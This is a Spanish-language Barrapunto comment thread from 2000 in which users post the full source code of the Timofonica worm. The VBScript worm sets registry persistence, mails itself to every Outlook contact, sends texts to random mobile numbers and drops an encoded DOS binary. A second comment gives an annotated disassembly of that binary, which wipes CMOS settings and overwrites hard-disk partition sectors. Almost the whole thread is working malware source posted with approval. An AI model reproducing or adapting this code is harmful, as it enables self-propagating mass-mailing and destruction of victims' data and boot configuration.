
[  envía una historia |  página principal |  búsquedas |  tu cuenta |  encuestas |  especiales |  observatorio soft libre |  comunidad |  pregunta a /. |  debian |  ocio |  gnome |  lengua |  *bsd |  miradero |  empleo |  gazapos |  notas de prensa |  temas |  lo más|  faq ]  


 Cada comentario es responsabilidad de quien lo pone, pero cualquiera puede citarlo después, faltaría más. 
.
( Cambiar a modo plano | Pon tu comentario ) 
< Disminuye en uno |Umbral de esta página: 0 | Aumenta en uno > 
(Cuidado, la moderación podría tener más fallos de los habituales)

 
El codigo Fuente (Score:1)
por J4an+, 07 de junio de 2000 (Miércoles), a las 10:24 CET 
(Información de usuario)  
JEJEJE esta mucho mas organizado que el virus ILOVEYOU y en castellano! 


El codigo fuente es: 

------------------------------------------------- 

Timofonica() 

Sub Timofonica() 
If PreguntaSiHeEstadoAqui() 1 Then 
ModificarRegistro() 
CopiarVirusAFichero() 
CopiaTextoAFichero() 
CopiarCmosAFichero() 
EnviarCorreo() 
End If 
End Sub 

Function LeerRegistro(Clave) 
On Error Resume Next 
Dim Sistema 
Dim Retorno 

Set Sistema = CreateObject("WScript.Shell") 
Retorno = Sistema.RegRead(Clave) 

Set Sistema = Nothing 
LeerRegistro = Retorno 
End Function 

Function EscribirRegistro(Clave,Valor,Opcion) 
On Error Resume Next 
Dim Sistema 

Set Sistema = CreateObject("WScript.Shell") 
If Opcion = "REG_DWORD" Then 
Sistema.RegWrite Clave,Valor,"REG_DWORD" 
Else 
Sistema.RegWrite Clave,Valor 
End If 

Set Sistema = Nothing 
End Function 

Function PreguntaSiHeEstadoAqui 
On Error Resume Next 
Dim Retorno 

Retorno = LeerRegistro("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Timofonica") 

PreguntaSiHeEstadoAqui = Retorno 
End Function 

Sub ModificarRegistro 
On Error Resume Next 

EscribirRegistro "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Timofonica",1,"REG_DWORD" 
EscribirRegistro "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Outlook\Preferences\SaveSent",0,"REG_DWOR D" 
EscribirRegistro "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Cmos","Cmos.com","" 
End Sub 

Sub EnviarCorreo() 
On Error Resume Next 

Dim Contador 
Dim NumeroDeCarpetasDeDirecciones 
Dim Destinatario 
Dim Sistema 
Dim OutLook 
Dim Mapi 
Dim CarpetaDeDirecciones 

Set Sistema = CreateObject("WScript.Shell") 
Set OutLook = WScript.CreateObject("Outlook.Application") 
Set Mapi = OutLook.GetNameSpace("Mapi") 

For NumeroDeCarpetasDeDirecciones = 1 To Mapi.AddressLists.Count 
Set CarpetaDeDirecciones = Mapi.AddressLists(NumeroDeCarpetasDeDirecciones) 
For Contador = 1 To CarpetaDeDirecciones.AddressEntries.Count 
Set Mail = OutLook.CreateItem(0) 
Mail.Subject = "TIMOFONICA" 
Mail.Body = Mail.Body & "" 
Mail.Body = Mail.Body & "Es de todos ya conocido el monopolio de Telefónica pero no tan " 
Mail.Body = Mail.Body & "conocido los métodos que utilizó para llegar hasta este punto." 
Mail.Body = Mail.Body & vbcrlf 
Mail.Body = Mail.Body & "En el documento adjunto existen opiniones, pruebas y direcciones " 
Mail.Body = Mail.Body & "web con más información que demuestran irregularidades en compras " 
Mail.Body = Mail.Body & "de materiales, facturas sin proveedores, stock irreal, etc." 
Mail.Body = Mail.Body & vbcrlf 
Mail.Body = Mail.Body & "También habla de las extorsiones y favoritismos a empresarios tanto " 
Mail.Body = Mail.Body & "nacionales como internacionales. Explica también el por qué del fracaso " 
Mail.Body = Mail.Body & "en Holanda y qué hizo para adquirir el portal Lycos." 
Mail.Body = Mail.Body & vbcrlf 
Mail.Body = Mail.Body & "En las direcciones web del documento existen temas relacionados para " 
Mail.Body = Mail.Body & "que echéis un vistazo a los comentarios, informes, documentos, etc." 
Mail.Body = Mail.Body & vbcrlf 
Mail.Body = Mail.Body & "Como comprenderéis, esto es muy importante, y os ruego que reenviéis " 
Mail.Body = Mail.Body & "este correo a vuestros amigos y conocidos." 
Mail.Body = Mail.Body & vbcrlf 
Mail.Body = Mail.Body & vbcrlf 
Mail.Attachments.Add("C:\TIMOFONICA.TXT.vbs") 
Destinatario = CarpetaDeDirecciones.AddressEntries(Contador) 
Mail.Recipients.Add(Destinatario) 
Mail.Send 
Set Mail = Nothing 

Set Mail = OutLook.CreateItem(0) 
Mail.Subject = "TIMOFONICA" 
Mail.Body = " informa que: Telefónica te está engañando." 
Destinatario = DestinatarioMovil() 
Mail.Recipients.Add(Destinatario) 
Mail.Send 
Set Mail = Nothing 
Next 
Set CarpetaDeDirecciones = Nothing 
Next 

Set Sistema = Nothing 
Set OutLook = Nothing 
Set Mapi = Nothing 
Set CarpetaDeDirecciones = Nothing 
End Sub 

Function DestinatarioMovil 
On Error Resume Next 

Dim Prefijo 
Dim Numero 
Dim Destinatario 
Dim Aleatorio 

Aleatorio = 0 
Numero = "" 
Prefijo = "696" 
Destinatario = "@correo.movistar.net" 
Randomize 
Aleatorio = Int(8 * Rnd) 
If Aleatorio = 0 Then 
Prefijo = "609" 
ElseIf Aleatorio = 1 then 
Prefijo = "619" 
ElseIf Aleatorio = 2 then 
Prefijo = "629" 
ElseIf Aleatorio = 3 then 
Prefijo = "630" 
ElseIf Aleatorio = 4 then 
Prefijo = "639" 
ElseIf Aleatorio = 5 then 
Prefijo = "646" 
ElseIf Aleatorio = 6 then 
Prefijo = "649" 
End If 
For Contador = 1 To 6 
Randomize 
Aleatorio = Int(10 * Rnd) 
Numero = Numero & Aleatorio 
Next 

DestinatarioMovil = Prefijo & Numero & Destinatario 
End Function 

Sub CopiarVirusAFichero 
On Error Resume Next 

Dim Fso 
Dim Fichero 
Dim Copia 
Dim Handle 

Set Fso = CreateObject("Scripting.FileSystemObject") 
Set Fichero = Fso.OpenTextFile(WScript.ScriptFullname,1) 
Copia = Fichero.ReadAll 
Set Handle = Fso.GetFile(WScript.ScriptFullName) 
Handle.Copy("C:\TIMOFONICA.TXT.vbs") 

Set Fichero = Nothing 
Set TempDir = Nothing 
Set Handle = Nothing 
Set Fso = Nothing 
End Sub 

Sub CopiaTextoAFichero 
On Error Resume Next 

Dim Fso 
Dim Fichero 
Dim Copia 

Set Fso = CreateObject("Scripting.FileSystemObject") 
Set Fichero = Fso.CreateTextFile("C:\TIMOFONICA.TXT",True) 

Copia = "" 
Copia = Copia & "Comentarios" & vbcrlf 
Copia = Copia & "===========" & vbcrlf & vbcrlf 
Copia = Copia & "...." & vbcrlf 
Copia = Copia & "Tarifa plana de 6000 pts/mes." & vbcrlf 
Copia = Copia & "Extorsión." & vbcrlf 
Copia = Copia & "A principio de 1.998 tras un seguimiento de su gestión se descubrieron numerosas irregularidades en su gestión, amparadas hasta el momento, en el desconocimiento que nosotros teníamos sobre Internet." & vbcrlf 
Copia = Copia & "Compras de materiales, que nunca apareció por ningún lado, pero si la factura del proveedor." & vbcrlf 
Copia = Copia & "...." & vbcrlf 
Copia = Copia & "Yo pienso que si Timofonica (ke a fin de kuentas es la dueña de Terra) kiere soltar dineros para una ONG, no le hace falta hacer este tipo de acto solidario, es mas, me parece misero y ridikula la kantidad de un millon de pesetas .. " & vbcrlf 
Copia = Copia & "Son unos ridikulos de mierda, un millon de pesetas para ellos no es nada, pero un millon de hits en sus paginas mas a final de mes supone una pekeña subidita en las acciones de Terra en Bolsa." & vbcrlf 
Copia = Copia & "Total, ke Terra no son las Hermanitas de los Pobres (pobres monjas, kompararlas kon los chupasangres de Timofonica), NI NOSOTROS SEMOS GILIPOLLAS !!!" & vbcrlf 
Copia = Copia & "Podran decir ke estamos obsesionados, ke tamos en kontra de Timofonika, ke protestamos por vicio, PERO ES KE EN 3 AÑOS KE LLEVO EN INET SOLO LA HAN KAGADO UNA VEZ TRAS OTRA !! SI ES KE SE LO GANAN A PULSO !!" & vbcrlf 
Copia = Copia & "Lo dicho , todo lo ke güele a Telefonica SUX, o en castellano tradicional , APESTA !" & vbcrlf 
Copia = Copia & "...." & vbcrlf & vbcrlf 
Copia = Copia & "Direcciones" & vbcrlf 
Copia = Copia & "===========" & vbcrlf & vbcrlf 
Copia = Copia & "http://www.telefonica.es/" & vbcrlf 
Copia = Copia & "http://www.timofonica.com/" & vbcrlf 
Copia = Copia & "http://100scripts.islaweb.com/scripting-timofonica.html" & vbcrlf 
Copia = Copia & "http://www.www2.labrujula.net/wwwboard/messages2/1165.html" & vbcrlf 
Copia = Copia & "http://www.tinet.org/mllistes/pc/September_1998/msg00005.html" & vbcrlf 
Copia = Copia & "http://area3d.area66.com/forotec/_disc1/0000015b.htm" & vbcrlf 
Copia = Copia & "http://wwh.itgo.com/Phreaking.htm" & vbcrlf 
Copia = Copia & "http://www.rcua.alcala.es/archives/ham-ea/msg00780.html" & vbcrlf 
Copia = Copia & "http://www.areas.org/debate/dp/2/messages/18.html" & vbcrlf 
Copia = Copia & "http://www.fut.es/mllistes/parlem/January_1999/msg00208.html" & vbcrlf & vbcrlf 
Copia = Copia & "Visita estas páginas. Estás inivitado." & vbcrlf 
Fichero.Writeline(Copia) 
Fichero.Close 

Set Fichero = Nothing 
Set Fso = Nothing 
End Sub 

Sub CopiarCmosAfichero 
On Error Resume Next 
Dim Fso 
Dim Fichero 
Dim SystemDir 
Dim WinDir 
Dim Copia 
Dim Contador 

Set Fso = CreateObject("Scripting.FileSystemObject") 
Set WinDir = Fso.GetSpecialFolder(0) 
Set SystemDir = Fso.GetSpecialFolder(1) 
Set Fichero = Fso.CreateTextFile(SystemDir & "\Cmos.com",True) 

Copia = "" 
Copia = Chr(233) & Chr(003) & Chr(002) 
For Contador = 1 To 515 
Copia = Copia & Chr(000) 
Next 
Copia = Copia & Chr(232) & Chr(028) & Chr(000) & Chr(185) & Chr(004) & Chr(000) & Chr(198) & Chr(006) & Chr(003) & Chr(003) 
Copia = Copia & Chr(000) & Chr(198) & Chr(006) & Chr(004) & Chr(003) & Chr(001) & Chr(198) & Chr(006) & Chr(005) & Chr(003) & Chr(000) & Chr(232) & Chr(023) & Chr(000) & Chr(226) & Chr(236) 
Copia = Copia & Chr(184) & Chr(000) & Chr(076) & Chr(205) & Chr(033) & Chr(185) & Chr(064) & Chr(000) & Chr(139) & Chr(193) & Chr(250) & Chr(231) & Chr(112) & Chr(051) & Chr(192) & Chr(231) 
Copia = Copia & Chr(113) & Chr(251) & Chr(226) & Chr(244) & Chr(195) & Chr(014) & Chr(014) & Chr(031) & Chr(007) & Chr(081) & Chr(138) & Chr(209) & Chr(128) & Chr(194) & Chr(127) & Chr(138) 
Copia = Copia & Chr(054) & Chr(003) & Chr(003) & Chr(138) & Chr(014) & Chr(004) & Chr(003) & Chr(138) & Chr(046) & Chr(005) & Chr(003) & Chr(187) & Chr(003) & Chr(001) & Chr(184) & Chr(001) 
Copia = Copia & Chr(002) & Chr(205) & Chr(019) & Chr(114) & Chr(055) & Chr(051) & Chr(219) & Chr(081) & Chr(185) & Chr(004) & Chr(000) & Chr(128) & Chr(191) & Chr(197) & Chr(002) & Chr(005) 
Copia = Copia & Chr(116) & Chr(005) & Chr(131) & Chr(195) & Chr(016) & Chr(226) & Chr(244) & Chr(011) & Chr(201) & Chr(089) & Chr(116) & Chr(029) & Chr(138) & Chr(167) & Chr(194) & Chr(002) 
Copia = Copia & Chr(136) & Chr(038) & Chr(003) & Chr(003) & Chr(138) & Chr(167) & Chr(195) & Chr(002) & Chr(136) & Chr(038) & Chr(004) & Chr(003) & Chr(138) & Chr(167) & Chr(196) & Chr(002) 
Copia = Copia & Chr(136) & Chr(038) & Chr(005) & Chr(003) & Chr(232) & Chr(007) & Chr(000) & Chr(235) & Chr(182) & Chr(232) & Chr(002) & Chr(000) & Chr(089) & Chr(195) & Chr(232) & Chr(013) 
Copia = Copia & Chr(000) & Chr(080) & Chr(083) & Chr(187) & Chr(003) & Chr(001) & Chr(184) & Chr(001) & Chr(003) & Chr(205) & Chr(019) & Chr(091) & Chr(088) & Chr(195) & Chr(080) & Chr(081) 
Copia = Copia & Chr(087) & Chr(051) & Chr(192) & Chr(185) & Chr(000) & Chr(001) & Chr(191) & Chr(003) & Chr(001) & Chr(243) & Chr(171) & Chr(095) & Chr(089) & Chr(088) & Chr(195) 
Fichero.Writeline(Copia) 
Fichero.Close 

Fichero = WinDir & "\Notepad.exe C:\TIMOFONICA.TXT" 
EscribirRegistro "HKEY_LOCAL_MACHINE\Software\CLASSES\VBSFile\Shell\Open\Command\",Fichero,"" 

Set Fichero = Nothing 
Set SystemDir = Nothing 
Set Fso = Nothing 
End Sub 


 
[ Responde a esto | Padre ]  
 
Yo tengo los mensajes que envía (Score:1)
por EsePibe, 07 de junio de 2000 (Miércoles), a las 15:50 CET 
(Información de usuario) http://barrapunto.com
 
El fichero cmos.com lo he visto en el foro es.comp.hackers 

>; Desensamblado y clarificado por Lokutus, con ayuda del Sourcer, 
>; un desensamblador que era buenísimo para los programas de DOS. 
> 
>TIMOFONICA SEGMENT 
> ASSUME CS:TIMOFONICA, DS:TIMOFONICA 
> 
> 
> ORG 100h 
>cmos PROC FAR 
> 
> start: 
> JMP COMENZAR 
> 
> ; Aqui guarda las variables. 
> ; Aqui guarda la tabla de partición. 
> 
EXTFS EQU 5 

BUFFER EQU $ 
>DB 447 DUP (0) 
> 
PCARA DB 0 
PSECT DB 0 
PCIL DB 0 
PTYPO DB 0 
>DB 61 DUP (0) 
> 
CARA DB 0 
CIL DB 0 
SECT DB 0 
> 
> ; Este código sería algo así como el main() de un programa escrito en C 
> 
> COMENZAR: 
> CALL BORRA_CMOS 
> MOV CX,4 
> 
> LOCLOOP_2: 
MOV CARA, 0 
MOV CIL, 1 
MOV SECT, 0 
> ; CL es además el disco duro al que dirigirse. 
CALL MACHACA_PART 
> LOOP LOCLOOP_2 ; Salto condicional a LOCLOOP_2 si CX > 0 
> 
> MOV AX,4C00H ; Nos vamos 
> INT 21H 
> 
>cmos ENDP 
> 
> 
>; Borra la cmos, o sea, los datos de configuración que tengas almacenado, 
>como la hora, fecha, 
>; configuración de tipo de disco duro, etc, por lo que despues de arrancar 
>tu sistema 
>; te llevarás un buen susto cuando no arranque. 
>; Las interrupciones las desabilita para que no pete en Windows NT/2000, que 
>no permitirá 
>; la faena. 
> 
>BORRA_CMOS PROC NEAR 
> 
> MOV CX,40H 
> 
> LOCLOOP_3: 
> MOV AX,CX 
> CLI ; Deshabilita interrupciones 
> OUT 70H,AX ; Puerto 70 es el Reloj de tiempo real, 
>función de habilitar/ 
> ; deshabilitar RTC. 
> XOR AX,AX ; AX = 0 
> OUT 71H,AX ; port 71H, RTC clock/RAM data 
> STI ; Enable interrupts 
> LOOP LOCLOOP_3 ; Loop if cx > 0 
> RETN 
> 
>BORRA_CMOS ENDP 
> 
> 
MACHACA_PART PROC NEAR 
> 
> PUSH CS ; Pone el segmento de datos y el extra al de código 
> PUSH CS 
> POP DS 
> POP ES 
> PUSH CX 
> 
> MOV DL,CL 
> 
> ; Aqui tendría que tener un 80H para direccionar el disco duro, 
> ; el 7FH lo suma a CL que empieza siendo 4, luego 3, 2, 1, o sea, 
> ; accede consecutivamente a las unidades C:, D:, E. F, siempre y cuando se 
> ; traten de discos duros. 
> ; 
> 
> ADD DL,7FH 
> 
> LOC_4: 
MOV DH,CARA ; 0 Cabeza del disco duro 
MOV CL,CIL ; 1 cilindro del disco duro 
MOV CH,SECT ; 0 Sector del disco duro 
MOV BX,BUFFER 
MOV AX,201H ; AH=02 (LEER) ; AL=1 (1 sector) 
> INT 13H ; Lee tabla de partición y la pone en es:bx 
> ; Si falla, acarreo activado 
> 
> JC SALIR ; Salto condicional si acarreo. 
> XOR BX,BX ; BX = 0 
> PUSH CX 
> MOV CX,4 
> 
> ; Esto no se por que lo hace, sólo se que busca un 5. 
; joer!, es que ni te has molestado en mirarlo. ;-) 
; Sólo te queda una capullada, y lo mandas para que le pongamos 
; el merengue? 
; Bueno, he estado buscando donde tengo una tabla con los 
; códigos de partición actualizada, pero no la encuentro :-( 
; Al final pongo lo que tengo ahora. 
; Más info útil en http://www.users.intercom.com/~ranish/part/ 
; Con el diskedit de norton (para DOS) puedes aprender mucho mirando 
; la particion de tu disco, y guardándola por si te la frie un virus. 
; Y que como comenta alguine en otro mensaje no es lo único que 
; deberías tener guardado. }:-) 
> 
> LOCLOOP_5: ; do { 
CMP PTYPO[BX],EXTFS ; Busca particiones extendidas 
> JE LOC_6 ; if (DATA_5[BX] == 5) break; 
ADD BX,10H ; Hay 4 posibles, y cada entrada ocupa 16bytes 
> LOOP LOCLOOP_5 ; } while (cx > 0); 
> 
> LOC_6: ; xref 
>76BE:0360 
> OR CX,CX ; Zero ? 
> POP CX 
> JZ LOC_7 ; Jump if zero 
MOV AH,PCARA[BX] ; copia la informacion de la particion 
MOV CARA,AH ; a las variables internas donde se va 
MOV AH,PSECT[BX] ; a escribir 
MOV SECT,AH 
MOV AH,PCIL[BX] 
MOV CIL,AH 
> CALL BORRA_SECTOR 
> JMP SHORT LOC_4 
> 
> LOC_7: 
> CALL BORRA_SECTOR 
> 
> SALIR: 
> POP CX 
> RETN 
> 
MACHACA_PART ENDP 
> 
> 
>; Escribe un sector del disco duro. 
>; En CH se pasa el cilindro, en CL el sector 
>; En DH se pasa la cabeza, y en DL la unidad, (80H para disco duro) 
>; Al llamar a RELLENA_CEROS que rellena de ceros el buffer, lo que en 
>realidad hace 
>; es borrar sector. 
> 
>BORRA_SECTOR PROC NEAR 
> CALL RELLENA_CEROS 
> 
> PUSH AX 
> PUSH BX 
> 
MOV BX,BUFFER 
MOV AX,301H ; AH=03 (ESCRIBIR) ; AL=01 (1 sector) 
> INT 13H ; ES:BX apunta al buffer de escritura 
> 
> POP BX 
> POP AX 
> RETN 
>BORRA_SECTOR ENDP 
> 
> 
> 
>; Rellena a ceros 256 posiciones de memoria empezando por ES:[DI] 
;Son 256 palabras = 512byes 
> 
>RELLENA_CEROS PROC NEAR 
> 
> PUSH AX 
> PUSH CX 
> PUSH DI 
> 
> XOR AX,AX 
MOV CX,100H ; Contador del bucle (256 words) 
MOV DI,BUFFER ; posición de comienzo 
> REP STOSW ; Mientras CX>0 escribe AX en ES:[DI] y decrementa CX 
> 
> POP DI 
> POP CX 
> POP AX 
> 
> RETN 
>RELLENA_CEROS ENDP 
> 
> DB 0DH, 0AH 
> 
>TIMOFONICA ENDS 
> 
> 
>END START 
> 

 
[ Responde a esto | Padre ]  
 
Cada comentario es responsabilidad de quien lo pone, pero cualquiera puede citarlo después, faltaría más. 
.
( Cambiar a modo plano | Pon tu comentario ) 
< Disminuye en uno |Umbral de esta página: 0 | Aumenta en uno > 
(Cuidado, la moderación podría tener más fallos de los habituales)

 
 
 
      Este sitio está basado en software de Slashdot
  
Todas las marcas registradas y copyrights de esta página son de sus respectivas empresas. Los comentarios son de quien los hace. El resto: © 1999 Open Resources  

[  envía una historia |  página principal |  búsquedas |  tu cuenta |  encuestas |  especiales |  observatorio soft libre |  comunidad |  pregunta a /. |  debian |  ocio |  gnome |  lengua |  *bsd |  miradero |  empleo |  gazapos |  notas de prensa |  temas |  lo más|  faq ] 